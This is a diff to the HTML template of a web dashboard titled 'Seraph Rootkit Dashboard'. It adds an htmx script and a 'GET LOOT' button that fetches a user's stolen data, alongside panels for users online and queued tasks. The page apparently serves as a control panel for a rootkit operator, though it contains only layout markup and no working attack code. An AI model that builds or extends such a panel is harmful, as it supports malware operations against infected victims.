@@ -12,6 +12,7 @@ BENTO-BOX (bento-grids.com)
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+		<script src="https://unpkg.com/htmx.org@2.0.1"></script>
     <link href="/static/styles.css" rel="stylesheet">
   </head>
 
@@ -22,17 +23,20 @@ BENTO-BOX (bento-grids.com)
         <p class="text">Welcome to the Seraph Rootkit Dashboard.</p>
       </div>
     </nav>
-        <div class="grid-container">
-          <div class="box box1">
-            <h1 class="title">Users Online:</h1>
-            <h1 class="title" style="color:#4a53ce;">168</h1>
-          </div>
+      <div class="grid-container">
+        <div class="box box1">
+          <h1 class="title">Users Online:</h1>
+          <h1 class="title" style="color:#4a53ce;">168</h1>
+        </div>
         <div class="box box2">User Data in a nice grid layout here</div>
-        <div class="box box3">Loot</div>
+        <div class="box box3">
+          <p class="text">Loot</p>
+        </div>
         <div class="box box4">
-          <h2 class="title">Get loot of user</h2>
+          <h2 class="title">Get loot of user:</h2>
           <input type="text" placeholder="username" />
           <button type="submit" class="button-primary">Submit</button>
+          <button hx-get="/loot/SOMEONE" hx-target="#table-body" hx-swap="innerHTML" class="button-secondary">GET LOOT</button>
         </div>
         <div class="box box5">
           <h1 class="title">Queued Tasks:</h1>
